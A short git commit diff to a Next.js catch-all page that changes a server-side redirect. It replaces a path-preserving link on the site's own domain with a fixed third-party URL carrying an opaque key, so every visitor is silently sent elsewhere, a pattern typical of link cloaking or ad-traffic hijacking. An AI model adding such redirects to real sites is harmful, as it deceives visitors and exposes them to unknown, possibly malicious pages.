876ea85be9f6ef8214f5f33e5dca4f08bf74ed16
kashifads <134289723+kashifads@users.noreply.github.com>
2023-05-22 18:21:42 +0500

    Update [...postpath].tsx

--- Pages/[...postpath].tsx
+++ Pages/[...postpath].tsx
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://saveourstateok.org/` + encodeURI(path as string)
+					`https://releasedfinish.com/ufugkyq5?key=801e8794afbde9e1b6dd5ae43b59802a/` 
 				}`,
 			},
 		};
